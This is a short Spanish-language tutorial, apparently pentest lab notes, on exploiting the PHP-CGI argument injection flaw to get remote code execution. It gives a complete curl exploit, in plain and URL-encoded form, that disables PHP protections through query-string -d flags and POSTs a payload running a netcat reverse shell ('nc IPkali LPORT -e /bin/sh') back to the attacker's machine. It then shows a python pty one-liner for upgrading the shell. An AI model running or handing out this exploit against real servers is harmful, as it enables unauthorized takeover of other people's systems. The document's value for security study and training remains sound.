
**- PHP CGI argument injection RCE**

La vulnerabilidad *PHP CGI argument injection que deriva en Remote Code Execution* afecta a las versiones PHP 5.3.12 y 5.4.x anteriores a la 5.4.2, y *explota una configuracion donde PHP está configurado como un script CGI* también conocido como PHP-CGI o PHP5-CGI.

La vulnerabilidad permite pasar argumentos de línea de comandos al intérprete PHP, vía URL hechas a mano de forma especial, resultando en la desactivación de varias directivas de protección PHP, las cuales luego son procesadas en el servidor por medio de nuestro payload PHP. Lo que deriva en RCE (Ejecución Remota de Comandos) y nos permite ejecutar el comando que nos de la gana.

Nosotros explotaremos la vulnerabilidad para conseguir una reverse shell de netcat.

La versión vulnerable de PHP que usaremos será la 5.2.4

Proove of Concept (PoC) usando curl. Sin usar URL encoding, en el comando se puede ver que le estamos pasando argumentos al intérprete PHP mediante la flag -d. Lo que permite manipular los valores asociados a la configuración de PHP, disminuyendo de ésta forma la seguridad PHP, particularmente los parámetros *allow_url_include, safe_mode y auto_prepend_file*, además, para desactivar varias directivas PHP, incluimos nuestro payload como parte del *--data-binary* del comando curl. 

```
curl -i -s -k -X 'POST' --data-binary "<?php system (\"nc IPkali LPORT -e /bin/sh\"); die; ?>" "http://IPobjetivo/cgi-bin/php5?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n"
```

**Para que el intérprete pueda ejecutar la petición con éxito hay que URL encodear los carácteres especiales.**

```
(espacio) = + ó %20
(=) = %3d
(/) = %2f
(.) = %2e
(") = %22
(-) = %2d
(:) = %3a
```

**Y la petición quedaría así:

```
curl -i -s -k -X 'POST' --data-binary "<?php system(\"nc IPkali LPORT -e /bin/sh\"); die; ?>" "http://IPobjetivo/cgi-bin/php5?%2dd+allow_url_include%3don+%2dd+safe_mode%3doff+%2dd+suhosin%2esimulation%3don+%2dd+disable_functions%3d%22%22+%2dd+open_basedir%3dnone+%2dd+auto_prepend_file%3dphp%3a%2f%2finput+%2dd+cgi%2eforce_redirect%3d0+%2dd+cgi%2eredirect_status_env%3d0+%2dn"
```

Antes de realizar la petición habría que ponerse a la escucha con netcat en la máquina atacante por el LPORT que le digamos.

Después de ganar acceso, para obtener una shell semi-interactiva (si la víctima tiene python):

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

Sino hacer un tratamiento de la TTY.